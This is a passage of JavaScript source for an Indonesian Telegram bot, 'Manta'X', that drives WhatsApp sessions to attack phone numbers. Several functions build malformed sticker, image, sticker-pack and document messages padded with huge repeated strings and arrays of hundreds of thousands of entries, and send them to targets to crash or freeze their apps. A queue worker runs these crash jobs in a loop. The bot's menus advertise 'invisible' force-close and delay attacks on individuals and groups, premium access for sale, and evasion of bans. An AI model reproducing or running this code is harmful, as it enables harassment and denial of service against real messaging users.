    { upload: otax.waUploadToServer }
  )

  media.stickerMessage.contextInfo = { pairedMediaType: 1, statusSourceType: 1, isForwarded: true, forwardingScore: 9999999, statusAttributionType: 2, urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})) } }

  /*media.stickerMessage.contextInfo = {
  "remoteJid": "120363402921136550@newsletter",
  "fromMe": true,
  "id": "3A1C0D6147EA7069C403",
  "quotedMessage": {
  "interactiveMessage": {
  "header": {
  "title": "" + "\0".repeat(300000),
  "hasMediaAttachment": false
  },
  "body": {
    "text": "Manta'X"
  },
  "nativeFlowMessage": {
  "buttons": [
  {
  "name": "cta_url",
  "buttonParamsJson": "{}"
  }],
  "messageParamsJson": "{"
  }}}}*/

  let message = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: media.stickerMessage
      }
    }
  }

  for (let i = 0; i < 1; i++) {
    await otax.relayMessage(target, message, {
      messageId: generateMessageIDV2(),
      participant: { jid: target }
    })
    await sleep(2000)
  }
}

async function oombimg(otax, target) {
  const msg = generateWAMessageFromContent("status@broadcast", {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 388944,
      height: 1600,
      width: 1200,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      caption: "MantaXxx",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        2899999999999999077,
        1799999999999998555,
        7699999999999999148,
        1069999999999999164
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  }, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  })
}
async function packBlank(otax, target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  await otax.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "9999999999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              creatorName: "Bot"
            }
          }
        },
        packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}
//=================================================//
async function AtrasoFvck() {

  if (wtfBro) return;
  wtfBro = true;

  const wtfXrL = Array.from({ length: memek_ibulu }).map(() =>
    (async () => {
      while (true) {
        const job = CallQueue.shift();
        if (!job) {
          await wait(2);
          continue;
        }

        try {
          const start = Date.now();
          await crashIng2(job.number);
          const duration = Date.now() - start;

          if (duration > 200) adaptiveKontl += 5;
          else if (adaptiveKontl > delay_kont) adaptiveKontl -= 1;

        } catch { }

        await wait(adaptiveKontl);
      }
    })()
  );

  await Promise.all(wtfXrL);
}
async function docThumb(otax, target, gs = false, array = true) {
  const docs = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
      fileLength: "72028",
      pageCount: 1,
      mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
      fileName: "ZeppsynC.pdf",
      fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
      directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1779839963",
      thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
      thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
      thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
      jpegThumbnail: "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",
      contextInfo: {},
      thumbnailHeight: 480,
      thumbnailWidth: 480
    }
  };

  const msg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        documentMessage: docs.documentMessage
      },
      body: {
        text: "MantaXxx"
      },
      nativeFlowMessage: {
        buttons: array ? Array.from({ length: 500000 }, () => ({})) : "[".repeat(500000)
      }
    }
  }

  await otax.relayMessage(target, gs ? {
    groupStatusMessageV2: {
      message: msg
    }
  } : msg, {
    participant: { jid: target }
  })
}
//=================================================//

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}
const bugRequests = {};
let AU_HAS_RUN = false;

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();

  if (shouldIgnoreMessage(msg)) return;

  if (!AU_HAS_RUN) {
    AU_HAS_RUN = true;
    if (isOwner(senderId)) __autoOwnerChatId = chatId;

    if (senderId.toString() !== "1925763520") {
      try {
        const remote = await __getRemoteVersion();
        if (remote && remote.version !== __UPD.LOCAL_VERSION) {
          await bot.sendMessage(chatId, `\`\`\`
❖ ───【 мαηтα'χ 】─── ❖
Update Terdeteksi!! Mengambil File Terbaru....\`\`\``);
          await __doUpdate(chatId, true);
        }
      } catch (e) {
        console.error("AutoUpdate initial check failed:", e);
      }
    }
  }

  bot.sendPhoto(chatId, botLinks.welcome || defaultLinks.welcome, {
    caption: `\`\`\`
❖ ───【 мαηтα'χ 】─── ❖

Halo ${username}, selamat menggunakan "мαηтα'χ".
Harap gunakan bot ini dengan bijak dan bertanggung jawab.

    [ Informasi Sistem ]
    
 ➥ Owner    : @Otapengenkawin
 ➥ Versi    : мαηтα'χ 1.1
 ➥ Runtime  : ${runtime}
 ➥ ID Kamu  : ${senderId}

ᝰ.ᐟ Selalu baca setiap informasi yang diberikan.

×͜× Pencet salah satu tombol di bawah untuk memulai.
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✇ Menu Bug", callback_data: "bugmenu", icon_custom_emoji_id: "5197352392054327515", style: "danger" },
          { text: "⌘ Menu Tools", callback_data: "toolsmenu", icon_custom_emoji_id: "5363892211098339885", style: "success" }
        ],
        [
          { text: "♚ Owner Tools", callback_data: "ownermenu", icon_custom_emoji_id: "5258337316715373336" }
        ]
      ]
    }
  });
});
bot.onText(/\/autoai(?:\s+(on|off))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const arg = match[1]
  if (!arg && !isOwner(senderId)) {
    bot.sendMessage(chatId, `Status AutoAI: ${autoai ? 'ON' : 'OFF'}\nPake: /autoai on atau /autoai off`);
    return;
  }
  if (arg === 'on' && isOwner(senderId)) {
    autoai = true;
    bot.sendMessage(chatId, 'AutoAI diaktifkan ✅');
  } else if (arg === 'off' && isOwner(senderId)) {
    autoai = false;
    bot.sendMessage(chatId, 'AutoAI dimatikan ❌');
  }
});
bot.on('message', async (msg) => {
  if (!autoai) return;
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userText = msg.text;
  if (!chatId.type === "private") return bot.sendMessage(chatId, "Gunakan AI di private chatt!!!", {
    reply_to_message_id: msg.message_id
  })

  if (!userText || userText.startsWith('/')) return;

  if (!chatSessions.has(userId)) {
    chatSessions.set(userId, [
      { "role": "user", "content": prompts },
      { "role": "assistant", "content": "okay" }
    ]);
  }

  let sessionai = chatSessions.get(userId);
  sessionai.push({ "role": "user", "content": prompts }, { "role": "assistant", "content": "okay" });
  sessionai.push({ "role": "user", "content": userText });

  try {
    await bot.sendChatAction(chatId, 'typing');
    const answer = await deepAiChat(userText, sessionai);
    sessionai.push({ "role": "assistant", "content": answer });
    bot.sendMessage(chatId, `<blockquote>${answer}</blockquote>`, {
      parse_mode: 'HTML',
      reply_to_message_id: msg.message_id
    });
  } catch (e) {
    console.error('AI error:', e);
    bot.sendMessage(chatId, 'Error pas proses AI');
  }
});
bot.onText(/\/spotify(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match && match[1] ? match[1].trim() : '';

  if (!query) return bot.sendMessage(chatId, 'Masukkan judul lagu!');

  bot.sendMessage(chatId, 'Mencari Music...');

  try {
    const { data } = await axios.get(`https://aliicia.my.id/api/music?alicia=${encodeURIComponent(query)}`);

    if (!data.status || !data.result.length) {
      return bot.sendMessage(chatId, 'Lagu tidak ditemukan.');
    }

    const results = data.result.slice(0, 10);
    const userId = msg.from.id;

    listMusic.set(userId, results);

    let text = '🎧 Hasil pencarian:\n\n';
    results.forEach((item, i) => {
      text += `${i + 1}. ${item.title}\n`;
    });

    const buttons = [];
    for (let i = 0; i < results.length; i += 5) {
      const row = [];
      results.slice(i, i + 5).forEach((_, j) => {
        const index = i + j;
        row.push({
          text: `${index + 1}`,
          callback_data: `music_${index}`
        });
      });
      buttons.push(row);
    }

    bot.sendMessage(chatId, text, {
      reply_markup: {
        inline_keyboard: buttons
      }
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, 'Terjadi kesalahan\n' + e);
  }
});
bot.onText(/\/removebg(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1];
  const reply = msg.reply_to_message;
  async function getFileLink(fileId) {
    const file = await bot.getFile(fileId);
    return `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;
  }

  try {
    let imageUrl;
    if (args && args.startsWith("http")) {
      imageUrl = args;
    } else if (reply && reply.photo) {
      const photo = reply.photo[reply.photo.length - 1];
      imageUrl = await getFileLink(photo.file_id);
    } else {
      return bot.sendMessage(chatId, "Gunakan: Reply Foto");
    }

    await bot.sendMessage(chatId, "Menghapus background...");

    const resApi = await axios.post(
      `https://joozxdev.my.id/api/removebg?image_url=${encodeURIComponent(imageUrl)}`,
      null,
      { responseType: "arraybuffer" }
    );

    const buffer = Buffer.from(resApi.data);

    await bot.sendPhoto(chatId, buffer, {
      caption: "Background berhasil dihapus!"
    });

  } catch (err) {
    console.error("Error /removebg:", err.response?.data || err.message);
    await bot.sendMessage(chatId, "Gagal hapus background.");
  }
});
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;

    if (query.data.startsWith('pair_wa_') || query.data.startsWith('pair_tele_')) return;

    const runtime = getBotRuntime();

    let caption = "";
    let replyMarkup = {};

    const navButtons = {
      inline_keyboard: [
        [
          { text: "✇ Menu Bug", callback_data: "bugmenu", icon_custom_emoji_id: "5197352392054327515", style: "danger" },
          { text: "⌘ Menu Tools", callback_data: "toolsmenu", icon_custom_emoji_id: "5363892211098339885", style: "success" }
        ],
        [
          { text: "♚ Owner Tools", callback_data: "ownermenu", icon_custom_emoji_id: "5258337316715373336" }
        ]
      ]
    };

    const navButtonsWithBack = {
      inline_keyboard: [
        [
          { text: "✇ Menu Bug", callback_data: "bugmenu", icon_custom_emoji_id: "5197352392054327515", style: "danger" },
          { text: "⌘ Menu Tools", callback_data: "toolsmenu", icon_custom_emoji_id: "5363892211098339885", style: "success" }
        ],
        [
          { text: "♚ Owner Tools", callback_data: "ownermenu", icon_custom_emoji_id: "5258337316715373336" }
        ],
        [
          { text: "⟵ Kembali", callback_data: "back_to_main", icon_custom_emoji_id: "5352759161945867747", style: "danger" }
        ]
      ]
    };

    if (query.data === "bugmenu" || query.data === "bugmenu_1") {
      caption = `\`\`\`
❖ ───【 Menu Bug (1/3) 】─── ❖

    [ Invisible Bug ]
 ➥ /Xoya 62xx
    ↳ Mid Delay
 ➥ /Xnow 62xx
    ↳ Invisible Fc Ios
 ➥ /Xover 62xx
    ↳ High Delay
 ➥ /Strikes 62xx
    ↳ Harded Delay
 ➥ /Xsow 62xx
    ↳ Fc Spam Android (Not All Device)
 ➥ /Xlock 62xx
    ↳ Hard Spam 

📌 Penting:
- Invisible = Tidak Terlihat
- Bebas spam & anti-banned ✧
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "« Prev", callback_data: "bugmenu_3" },
            { text: "1 / 3", callback_data: "bugmenu_1" },
            { text: "Next »", callback_data: "bugmenu_2" }
          ],
          [
            { text: "⟵ Kembali", callback_data: "back_to_main", style: "danger" }
          ]
        ]
      };
    }

    else if (query.data === "bugmenu_2") {
      caption = `\`\`\`
❖ ───【 Menu Bug (2/3) 】─── ❖

    [ Visible Bug ]
 ➥ /Xcl
    ↳ Blank Click

📌 Penting:
- Visible = Terlihat
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "« Prev", callback_data: "bugmenu_1" },
            { text: "2 / 3", callback_data: "bugmenu_2" },
            { text: "Next »", callback_data: "bugmenu_3" }
          ],
          [
            { text: "⟵ Kembali", callback_data: "back_to_main", style: "danger" }
          ]
        ]
      };
    }

    else if (query.data === "bugmenu_3") {
      caption = `\`\`\`
❖ ───【 Menu Bug (3/3) 】─── ❖

    [ Group Bug ]
 ➥ /BugGroup Link/JID/Nama
    ↳ Blank Click + Blank No Click
 ➥ /DelayGb Link/JID/Nama
    ↳ Delay All Memb Group

📌 Penting:
- Gunakan untuk target grup
- Bebas spam & anti-banned ✧
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "« Prev", callback_data: "bugmenu_2" },
            { text: "3 / 3", callback_data: "bugmenu_3" },
            { text: "Next »", callback_data: "bugmenu_1" }
          ],
          [
            { text: "⟵ Kembali", callback_data: "back_to_main", style: "danger" }
          ]
        ]
      };
    }

    else if (query.data === "toolsmenu") {
      caption = `\`\`\`
❖ ───【 Menu Tools 】─── ❖

    [ Menu Sender ]
 ➥ /reqpair 62xx
    ↳ Tambah Sender Pairing
 ➥ /listpair
    ↳ Lihat Semua Sender Aktif
 ➥ /refresh
    ↳ Reconnect Sender Terlepas

    [ Menu Premium ]
 ➥ /addprem id 1d/7d/30d
    ↳ Tambah User Premium
 ➥ /delprem id
    ↳ Hapus User Premium
 ➥ /cekprem
    ↳ Lihat Semua User Premium

    [ Menu Update ]
 ➥ /update
    ↳ Update File Terbaru
 ➥ /cekupdate
    ↳ Cek Status Update Terbaru
 ➥ /upon
    ↳ Auto Update ( ON )
 ➥ /upoff
    ↳ Auto Update ( OFF )

    [ Fitur Lainnya ]
 ➥ /cekid
    ↳ Cek ID user
 ➥ /chatid
    ↳ Cek ID chat ini
 ➥ /spotify
    ↳ Cari lagu
 ➥ /removebg
    ↳ Menghapus background gambar
 ➥ /tourl (reply)
    ↳ Mengubah file menjadi URL
 ➥ /autoai [on/off]
    ↳ AI auto response
\`\`\``;
      replyMarkup = navButtonsWithBack;
    }

    else if (query.data === "ownermenu") {
      caption = `\`\`\`
❖ ───【 Menu Owner 】─── ❖

    [ Fitur Owner ]
 ➥ /block
    ↳ Cek status semua command
 ➥ /block [cmd]
    ↳ Block cmd (Contoh: /block Xsow)
 ➥ /unblock [cmd]
    ↳ Unblock cmd (Contoh: /unblock Xsow)
 ➥ /aturphoto
    ↳ Mengatur foto script

    [ Menu Setting ]
 ➥ /groupon
    ↳ Mode Khusus Grup ( ON )
 ➥ /groupoff
    ↳ Mode Khusus Grup ( OFF )
 ➥ /addgroup
    ↳ Tambah Grup Diizinkan
 ➥ /delgroup
    ↳ Hapus Grup Diizinkan
 ➥ /cekid
    ↳ Cek ID User/Grup

    [ Menu Admin ]
 ➥ /addadmin id
    ↳ Tambah Admin Bot
 ➥ /deladmin id
    ↳ Hapus Admin Bot
 ➥ /cekadmin
    ↳ Lihat Semua Admin Bot
\`\`\``;
      replyMarkup = navButtonsWithBack;
    }

    else if (query.data === "back_to_main") {
      caption = `\`\`\`
❖ ───【 мαηтα'χ 】─── ❖

Halo ${username}, selamat menggunakan "мαηтα'χ".
Harap gunakan bot ini dengan bijak dan bertanggung jawab.

    [ Informasi Sistem ]
    
 ➥ Owner    : @Otapengenkawin
 ➥ Versi    : мαηтα'χ 1.1
 ➥ Runtime  : ${runtime}
 ➥ ID Kamu  : ${senderId}

    [ Terima Kasih Kepada ]
 ➥ ALLAH SWT
 ➥ Bundahara
 ➥ Ota (Dev)
 ➥ Ayun (Beloved)
 ➥ Xrelly (Dev)
 ➥ 7eppeli.org (Dev)
 ➥ Semua Pembeli Script

ᝰ.ᐟ Selalu baca setiap informasi yang diberikan.

×͜× Pencet salah satu tombol di bawah untuk memulai.
\`\`\``;
      replyMarkup = navButtons;
    }

    else if (query.data.startsWith("music_")) {
      const userId = chatId;
      const index = parseInt(query.data.split("_")[1]);

      const results = listMusic.get(userId);

      if (!results || !results[index]) {
        return bot.answerCallbackQuery(query.id, { text: "Data expired", show_alert: false });
      }

      const song = results[index];

      try {
        await bot.answerCallbackQuery(query.id, { text: "Loading..." });

        if (musicCache.has(song.url)) {
          return bot.sendAudio(userId, musicCache.get(song.url));
        }

        const dlPromise = axios.get(
          `https://aliicia.my.id/api/music?download=${encodeURIComponent(song.url)}`
        );

        const { data: dl } = await dlPromise;

        const audioUrl = dl.result.download_url;

        musicCache.set(song.url, audioUrl);

        await bot.sendAudio(userId, audioUrl, {
          caption: "мαηтα'χ",
          title: song.title,
          performer: song.author.name,
          thumb: song.thumbnail,
        });
      } catch (e) {
        console.error(e);
        bot.sendMessage(userId, "Gagal download lagu.\n" + e);
      }

      return;
    }

